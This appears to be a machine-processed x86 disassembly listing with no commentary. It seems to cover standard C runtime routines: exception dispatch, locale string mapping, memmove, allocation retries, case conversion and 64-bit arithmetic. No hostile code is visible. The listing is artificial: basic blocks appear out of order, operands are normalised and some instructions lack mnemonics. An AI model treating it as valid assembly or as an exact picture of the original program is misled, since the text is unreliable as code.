mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_42ef19
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_425abd
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_427bb4
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_427d16
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_42ef19
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_42a735
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_42ef19
call sub_42eecd
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_427c22
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_42a735
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_42a735
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_42a735
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_433800
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_425c33
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_42ef19
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_4276b2
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_42a735
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_42a735
mov edi [ eax + 0x94 ]
call sub_42a735
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_427743
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_427743
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_424598
test al al
jne r-xdata
call sub_42ef19
cmp eax 0x19930522
jne r-xdata
call sub_42a735
call sub_42a735
call sub_42a735
mov [ eax + 0x88 ] esi
call sub_42a735
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_4274e4
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_4276b2
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_427494
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_42597b
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_427bb4
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_425a00
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_42758c
add esp 0x10
push [ esi + 0x1c ]
call sub_4277be
sub_42807a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_42a735
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_427d16
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_42758c
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_428160
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_424869
pop ecx
sub_428180
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_433812
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_43385b
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_424869
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_424869
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_428160
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_425484
pop ecx
cmp eax ebx
je r-xdata
call sub_433a10
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_42b5a0
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_43385b
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_425484
pop ecx
cmp eax ebx
je r-xdata
call sub_433a10
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_428160
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_428160
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_425484
pop ecx
cmp eax ebx
je r-xdata
call sub_433a10
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_428525
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_423619
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_428180
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4285a0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_428628 ]
jmp [ ecx * 4 + jump_table_4286a8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_428714 ]
pop esi
pop edi
pop ebp
jmp sub_42fee9
jmp [ ecx * 4 + jump_table_4288b0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4287b4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4288b0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_428714 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4288b0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_428714 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_428714 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_428714 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4288b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4288b0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4288b0 ]
sub_428905
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_425484
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_42894a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42edaf
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_428996
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42554e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_4289e4
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433a3c
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_428ab9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_423619
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_425eb1
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_434645
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_42d5e8
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_428525
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_428bce
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_428ab9
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_428c00
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_428c70
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_428ca4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_425eb1
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_425eb1
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_425eb1
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_423d36
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
